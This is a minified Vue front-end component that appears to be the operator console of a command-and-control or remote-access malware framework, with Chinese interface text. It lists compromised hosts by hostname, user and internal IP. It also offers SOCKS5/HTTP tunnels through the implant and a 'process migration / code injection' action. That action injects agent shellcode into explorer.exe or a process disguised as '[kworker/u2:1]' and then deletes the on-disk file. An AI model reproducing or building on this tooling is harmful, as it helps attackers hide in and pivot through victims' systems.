import{_ as ve,o as ye,a as be,b as C,c as A,e as t,w as l,n as xe,d as p,q as i,A as $,B as q,g as G,E as f,h as a,m as w,C as Q,j as Ce,D as ke,G as Ve,H as Me,I as Te,J as he,s as z,t as M,u as _,K as De,p as Pe,L as Se,T as Be,M as Ue,k as Ae,N as $e,O as ze,P as Ee,Q as Ie,R as Le}from"./index-DG_0wL7P.js";import{s as Ne}from"./socks-BFdVWVik.js";const Oe={class:"card-header"},Fe={style:{"font-family":"'JetBrains Mono', monospace","font-size":"13px"}},Re={style:{"font-weight":"bold"}},je={style:{"font-family":"'JetBrains Mono', monospace"}},He={style:{color:"#909399","font-size":"13px"}},Je={class:"el-dropdown-link",style:{cursor:"pointer",color:"#409EFF",display:"flex","align-items":"center","justify-content":"center"}},Ke={key:0,class:"auth-box"},qe={class:"dialog-footer"},Ge={__name:"ClientManager",setup(Qe){const W=Me(),E=w([]),T=w(!1);let D=null;const m=w(null),g=w(!1),P=w(!1),s=Q({port:1080,type:"socks5",enableAuth:!1,username:"",password:""}),v=w(!1),S=w(!1),y=w("explorer.exe"),r=Q({visible:!1,x:0,y:0,row:null}),X=Ce(()=>({top:`${r.y}px`,left:`${r.x}px`})),Y=(n,e,u)=>{u.preventDefault(),r.x=u.clientX,r.y=u.clientY,r.row=n,r.visible=!0},k=()=>{r.visible=!1},Z=(n,e)=>{var u;switch(m.value=e,n){case"manage":I();break;case"tunnel":g.value=!0;break;case"migrate":y.value=(u=e.os)!=null&&u.toLowerCase().includes("linux")?"[kworker/u2:1]":"explorer.exe",v.value=!0;break;case"delete":L();break}},I=()=>{m.value&&W.push({name:"ClientDetail",params:{id:m.value.uuid}})},L=()=>{const n=m.value;n&&ke.confirm(`确定要删除主机 ${n.hostname} (${n.ip}) 吗？
这将清除数据库中的记录，但在 Agent 进程停止前它可能会重新上线。`,"删除确认",{confirmButtonText:"确定删除",cancelButtonText:"取消",type:"warning"}).then(async()=>{try{await Ve(n.uuid),f.success("主机记录已删除"),V()}catch{f.error("删除失败")}})},V=async()=>{T.value=!0;try{const n=await G.get("/api/clients");E.value=n.data}catch{f.error("无法获取客户端列表")}finally{T.value=!1}},ee=n=>n!=null&&n.toLowerCase().includes("win")?"primary":n!=null&&n.toLowerCase().includes("linux")?"warning":"info",te=async()=>{var n,e;if(s.enableAuth&&(!s.username||!s.password)){f.warning("启用认证时，用户名和密码不能为空");return}P.value=!0;try{await Ne({uuid:m.value.uuid,port:String(s.port),type:s.type,username:s.enableAuth?s.username:"",password:s.enableAuth?s.password:""}),f.success("隧道启动成功 (Tunnel Started)"),g.value=!1}catch(u){const d=((e=(n=u.response)==null?void 0:n.data)==null?void 0:e.message)||"启动尝试失败";f.error(d)}finally{P.value=!1}},le=async()=>{var e,u;if(!y.value){f.warning("请输入目标进程名");return}const n=Le.service({lock:!0,text:"正在下发迁移指令，请稍候...",background:"rgba(0, 0, 0, 0.7)"});S.value=!0;try{const d=await G.post("/api/clients/migrate",{uuid:m.value.uuid,target_process:y.value});d.data.status==="success"?(f.success(d.data.message),v.value=!1,V()):f.error(d.data.message||"迁移失败")}catch(d){f.error(((u=(e=d.response)==null?void 0:e.data)==null?void 0:u.error)||"请求失败")}finally{S.value=!1,n.close()}},oe=()=>{m.value=r.row,I(),k()},ne=()=>{var n,e;m.value=r.row,y.value=(e=(n=r.row)==null?void 0:n.os)!=null&&e.toLowerCase().includes("linux")?"[kworker/u2:1]":"explorer.exe",v.value=!0,k()},ae=()=>{m.value=r.row,g.value=!0,k()},se=()=>{m.value=r.row,L(),k()};ye(()=>{V(),D=setInterval(V,5e3)}),be(()=>{D&&clearInterval(D)});const re=n=>!n||n.startsWith("0001")?"从不":new Date(n).toLocaleString("zh-CN",{hour12:!1,year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"});return(n,e)=>{var H,J,K;const u=a("el-button"),d=a("el-table-column"),B=a("el-tag"),b=a("el-icon"),h=a("el-dropdown-item"),ie=a("el-dropdown-menu"),ue=a("el-dropdown"),de=a("el-table"),pe=a("el-card"),me=a("el-input-number"),x=a("el-form-item"),N=a("el-radio-button"),ce=a("el-radio-group"),fe=a("el-divider"),_e=a("el-switch"),U=a("el-input"),O=a("el-col"),we=a("el-row"),F=a("el-alert"),R=a("el-form"),j=a("el-dialog"),ge=Te("loading");return C(),A("div",{class:"client-manager",onClick:k},[t(pe,{shadow:"never"},{header:l(()=>[p("div",Oe,[e[13]||(e[13]=p("span",null,"在线终端列表 (V2)",-1)),t(u,{type:"primary",icon:_(Pe),circle:"",onClick:V,loading:T.value},null,8,["icon","loading"])])]),default:l(()=>[he((C(),z(de,{data:E.value,style:{width:"100%"},onRowContextmenu:Y},{default:l(()=>[t(d,{prop:"uuid",label:"UUID",width:"280","show-overflow-tooltip":""},{default:l(o=>[p("span",Fe,M(o.row.uuid),1)]),_:1}),t(d,{prop:"hostname",label:"主机名","min-width":"150",sortable:""},{default:l(o=>[p("span",Re,M(o.row.hostname),1)]),_:1}),t(d,{prop:"os",label:"OS",width:"120"},{default:l(o=>[t(B,{type:ee(o.row.os),size:"small"},{default:l(()=>[i(M(o.row.os),1)]),_:2},1032,["type"])]),_:1}),t(d,{prop:"username",label:"用户",width:"150","show-overflow-tooltip":""}),t(d,{prop:"ip",label:"内网 IP","min-width":"140"},{default:l(o=>[p("span",je,M(o.row.ip),1)]),_:1}),t(d,{prop:"last_seen",label:"最近上线",width:"160",sortable:""},{default:l(o=>[p("span",He,M(re(o.row.last_seen)),1)]),_:1}),t(d,{prop:"status",label:"状态",align:"center",width:"100"},{default:l(o=>[o.row.status==="online"?(C(),z(B,{key:0,type:"success"},{default:l(()=>[...e[14]||(e[14]=[i("在线",-1)])]),_:1})):(C(),z(B,{key:1,type:"info"},{default:l(()=>[...e[15]||(e[15]=[i("离线",-1)])]),_:1}))]),_:1}),t(d,{label:"操作",width:"100",align:"center",fixed:"right"},{default:l(o=>[t(ue,{trigger:"click",onCommand:c=>Z(c,o.row)},{dropdown:l(()=>[t(ie,null,{default:l(()=>[t(h,{command:"manage",icon:"Monitor",disabled:o.row.status!=="online"},{default:l(()=>[...e[17]||(e[17]=[i(" 管理终端 ",-1)])]),_:1},8,["disabled"]),t(h,{command:"tunnel",icon:"Connection",disabled:o.row.status!=="online"},{default:l(()=>[...e[18]||(e[18]=[i(" 启动隧道 ",-1)])]),_:1},8,["disabled"]),t(h,{command:"migrate",icon:"Promotion",disabled:o.row.status!=="online"},{default:l(()=>[...e[19]||(e[19]=[i(" 迁移至内存 ",-1)])]),_:1},8,["disabled"]),t(h,{command:"delete",icon:"Delete",style:{color:"#F56C6C"}},{default:l(()=>[...e[20]||(e[20]=[i(" 删除主机 ",-1)])]),_:1})]),_:2},1024)]),default:l(()=>[p("span",Je,[e[16]||(e[16]=p("span",{style:{"margin-right":"4px"}},"管理",-1)),t(b,null,{default:l(()=>[t(_(De))]),_:1})])]),_:2},1032,["onCommand"])]),_:1})]),_:1},8,["data"])),[[ge,T.value]])]),_:1}),t(j,{title:"启动网络隧道 (Network Tunnel)",modelValue:g.value,"onUpdate:modelValue":e[6]||(e[6]=o=>g.value=o),width:"480px","destroy-on-close":"",center:""},{footer:l(()=>[p("span",qe,[t(u,{onClick:e[5]||(e[5]=o=>g.value=!1)},{default:l(()=>[...e[24]||(e[24]=[i("取消",-1)])]),_:1}),t(u,{type:"primary",onClick:te,loading:P.value},{default:l(()=>[...e[25]||(e[25]=[i("立即开启",-1)])]),_:1},8,["loading"])])]),default:l(()=>[t(R,{"label-position":"top"},{default:l(()=>[t(x,{label:"服务监听端口 (VPS Port)"},{default:l(()=>[t(me,{modelValue:s.port,"onUpdate:modelValue":e[0]||(e[0]=o=>s.port=o),min:1,max:65535,"controls-position":"right",style:{width:"100%"}},null,8,["modelValue"])]),_:1}),t(x,{label:"隧道协议 (Protocol)"},{default:l(()=>[t(ce,{modelValue:s.type,"onUpdate:modelValue":e[1]||(e[1]=o=>s.type=o),style:{width:"100%",display:"flex"}},{default:l(()=>[t(N,{label:"socks5",style:{flex:"1","text-align":"center"}},{default:l(()=>[...e[21]||(e[21]=[i("SOCKS5",-1)])]),_:1}),t(N,{label:"http",style:{flex:"1","text-align":"center"}},{default:l(()=>[...e[22]||(e[22]=[i("HTTP",-1)])]),_:1})]),_:1},8,["modelValue"])]),_:1}),t(fe,{"content-position":"center"},{default:l(()=>[t(b,{style:{"vertical-align":"middle","margin-right":"5px"}},{default:l(()=>[t(_(Se))]),_:1}),e[23]||(e[23]=i(" 安全设置 (Security) ",-1))]),_:1}),t(x,{label:"身份验证 (Authentication)"},{default:l(()=>[t(_e,{modelValue:s.enableAuth,"onUpdate:modelValue":e[2]||(e[2]=o=>s.enableAuth=o),"active-text":"启用账号密码 (Enable)","inactive-text":"无认证 (Public)",style:{"--el-switch-on-color":"#13ce66"}},null,8,["modelValue"])]),_:1}),t(Be,{name:"el-zoom-in-top"},{default:l(()=>[s.enableAuth?(C(),A("div",Ke,[t(we,{gutter:15},{default:l(()=>[t(O,{span:12},{default:l(()=>[t(x,{label:"用户名 (Username)"},{default:l(()=>[t(U,{modelValue:s.username,"onUpdate:modelValue":e[3]||(e[3]=o=>s.username=o),placeholder:"例如: admin","prefix-icon":_(Ue)},null,8,["modelValue","prefix-icon"])]),_:1})]),_:1}),t(O,{span:12},{default:l(()=>[t(x,{label:"密码 (Password)"},{default:l(()=>[t(U,{modelValue:s.password,"onUpdate:modelValue":e[4]||(e[4]=o=>s.password=o),type:"password","show-password":"",placeholder:"设置强密码","prefix-icon":_(Ae)},null,8,["modelValue","prefix-icon"])]),_:1})]),_:1})]),_:1}),t(F,{title:"提示：认证配置将同时应用于 SOCKS5/HTTP 代理。",type:"info",closable:!1,"show-icon":""})])):q("",!0)]),_:1})]),_:1})]),_:1},8,["modelValue"]),t(j,{title:"进程迁移 (Process Migration / Code Injection)",modelValue:v.value,"onUpdate:modelValue":e[9]||(e[9]=o=>v.value=o),width:"400px","destroy-on-close":"",center:""},{footer:l(()=>[t(u,{onClick:e[8]||(e[8]=o=>v.value=!1)},{default:l(()=>[...e[26]||(e[26]=[i("取消",-1)])]),_:1}),t(u,{type:"danger",onClick:le,loading:S.value},{default:l(()=>[...e[27]||(e[27]=[i("立即迁移",-1)])]),_:1},8,["loading"])]),default:l(()=>[t(F,{title:"内存迁移说明",type:"warning",closable:!1,"show-icon":"",description:"系统将把 Agent Shellcode 注入到目标进程中。一旦成功，当前磁盘上的文件将被删除并自动退出。",style:{"margin-bottom":"20px"}}),t(R,{"label-position":"top"},{default:l(()=>[t(x,{label:"目标进程名 (Target Process)"},{default:l(()=>[t(U,{modelValue:y.value,"onUpdate:modelValue":e[7]||(e[7]=o=>y.value=o),placeholder:"例如: explorer.exe"},null,8,["modelValue"])]),_:1})]),_:1})]),_:1},8,["modelValue"]),r.visible?(C(),A("div",{key:0,style:xe(X.value),class:"custom-context-menu"},[p("div",{class:$(["menu-item",{disabled:((H=r.row)==null?void 0:H.status)!=="online"}]),onClick:e[10]||(e[10]=o=>{var c;return((c=r.row)==null?void 0:c.status)==="online"&&oe()})},[t(b,null,{default:l(()=>[t(_($e))]),_:1}),e[28]||(e[28]=i(" 管理终端 ",-1))],2),p("div",{class:$(["menu-item",{disabled:((J=r.row)==null?void 0:J.status)!=="online"}]),onClick:e[11]||(e[11]=o=>{var c;return((c=r.row)==null?void 0:c.status)==="online"&&ne()})},[t(b,null,{default:l(()=>[t(_(ze))]),_:1}),e[29]||(e[29]=i(" 迁移至内存 ",-1))],2),p("div",{class:$(["menu-item",{disabled:((K=r.row)==null?void 0:K.status)!=="online"}]),onClick:e[12]||(e[12]=o=>{var c;return((c=r.row)==null?void 0:c.status)==="online"&&ae()})},[t(b,null,{default:l(()=>[t(_(Ee))]),_:1}),e[30]||(e[30]=i(" 启动隧道 ",-1))],2),p("div",{class:"menu-item delete",onClick:se},[t(b,null,{default:l(()=>[t(_(Ie))]),_:1}),e[31]||(e[31]=i(" 删除主机",-1))])],4)):q("",!0)])}}},Ye=ve(Ge,[["__scopeId","data-v-bb81b3e7"]]);export{Ye as default};
